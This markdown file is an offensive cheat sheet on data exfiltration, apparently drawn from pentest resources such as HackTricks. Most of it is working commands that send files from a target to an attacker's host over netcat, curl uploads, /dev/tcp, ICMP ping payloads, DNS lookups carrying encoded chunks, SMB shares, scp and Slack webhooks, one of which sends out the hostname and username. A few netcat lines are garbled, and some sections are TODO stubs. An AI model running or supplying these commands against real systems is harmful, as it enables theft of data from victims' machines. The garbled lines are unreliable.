# Exfiltration

- [Exfiltration](#exfiltration)
  - [Web](#web)
  - [Curl](#curl)
    - [Server - Curl](#server---curl)
    - [Target - Curl](#target---curl)
  - [Netcat](#netcat)
    - [Target - Netcat](#target---netcat)
    - [Server - Netcat](#server---netcat)
  - [Other](#other)
    - [Target - Other](#target---other)
  - [ICMP](#icmp)
    - [Server - icyguider](#server---icyguider)
    - [Target - icyguider](#target---icyguider)
    - [LINUX - PING](#linux---ping)
  - [DNS](#dns)
    - [DNS - LINUX](#dns---linux)
    - [DNS - Powershell](#dns---powershell)
  - [Protocol Abuse](#protocol-abuse)
    - [SMB/SAMBA](#smbsamba)
    - [SFTP](#sftp)
    - [SSH](#ssh)
    - [SCP](#scp)
  - [Slack Webhooks](#slack-webhooks)
    - [Slack Webhooks - Curl](#slack-webhooks---curl)
    - [Slack Webhooks - Powershell - Invoke-RestMethod](#slack-webhooks---powershell---invoke-restmethod)
  - [Sources](#sources)

## Web

- [Dropbox](https://www.dropbox.com/home)
- [Pastebin](https://pastebin.com)
- ...

## Curl

### Server - Curl

```sh
nc -vn IP_ADDRESS PORT > FILE_TO_EXF
```

Or

```sh
nc -nvlp PORT > FILE_TO_EXF
```

### Target - Curl

```sh
curl -T FILE_TO_EXF http://SERVER_IP:PORT_L
```

## Netcat

### Target - Netcat

```sh
nc -vn IP_ADDRESS PORT > FILE_TO_EXF
```

Or

```sh
nc -nvlp PORT > FILE_TO_EXF
```

### Server - Netcat

```sh
nc -nvlp PORT > FILE_TO_EXF
```

```batch
nc -vn IP_ADDRESS PORT < $(cat FILE_TO_EXF)
```

## Other

### Target - Other

```batch
cat FILE_TO_EXF > /dev/tcp/IP_ADDRESS/PORT
```

## ICMP

### Server - icyguider

```python
python ICMP-ReceiveFile.py SRV_IP_ADD DST_IP_ADD FILE_PATH
```

### Target - icyguider

```powershell
Invoke-IcmpUpload.ps1 SRV_IP_ADD FILE_PATH
```

### LINUX - PING

```sh
icmptunnel -c IP_ADDRESS
```

Or

```sh
ipAdress=IP_ADDRESS;file=FILE;xxd -p -c 8 $file | while read line; do ping -c 1 -p $line $ipAdress; done
```

## DNS

### DNS - LINUX

```sh
for i in $(cat FILE); do d=$(echo $i|base64) && nslookup $d.DOMAIN.com; done
```

### DNS - Powershell

```bash
certutil -encodehex FILE_PATH encodedFile.hex 12
$fileData = Get-Content encodedFile.hex
#$fileData -split '(\w{32})' | ? {$_} #> SplitEncodedFile.hex
$chunkdata = $fileData -split '(\w{32})'
$i = 0
foreach( $chunk in $chunkdata){
  if( $chunk -ne ""){
    write-output "[$i] $chunk"
    $domain = $chunk + "."+ $i +".pentest"
    nslookup DNS_IP_ADDRESS $domain  | out-null
    $i++
  }
}
```

## Protocol Abuse

SSH/SMB/FTP/SSH/SCP/SFTP

### SMB/SAMBA

Server side:

```zsh
impacket-smbserver -smb2support -user USERNAME -password PASSWORD SHARE_NAME SHARE_PATH
```

Target side:

```bash
net use \\SERVER_IP\SHARE_NAME /user:USERNAME PASSWORD
copy FILE_TO_EXF \\SERVER_IP\SHARE_NAME
```

### SFTP

TODO

### SSH

TODO

### SCP

The attacker has to have SSHd running.

```sh
scp USERNAME@IP_ADDRESS:DIRECTORY/FILENAME
```

## Slack Webhooks

### Slack Webhooks - Curl

```batch
set data=This is posted to #server and comes from a bot named webhookbot.
set channel=server
set username=webhookbot
curl -X POST --data-urlencode "payload={\"channel\": \"#%channel%\", \"username\": \"%username%\", \"text\": \"%data%\", \"icon_emoji\": \":ghost:\"}" https://hooks.slack.com/services/TOKEN
```

### Slack Webhooks - Powershell - Invoke-RestMethod

```powershell
$msg = "Hostname: ${env:computername}`nUsername: ${env:username}"
$msgEnc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($msg))

$body= ConvertTo-Json @{
username = "Testbot"
pretext = "Automated Alert"
text = $msgEnc
icon_emoji="ghost"
}

Invoke-RestMethod https://hooks.slack.com/services/TOKEN -Method Post -Body $body -ContentType 'application/json'
```

## Sources

- <https://www.youtube.com/watch?v=1w0btuMAvZk>
- <https://book.hacktricks.xyz/generic-methodologies-and-resources/exfiltration>
- <https://github.com/icyguider/ICMP-TransferTools>
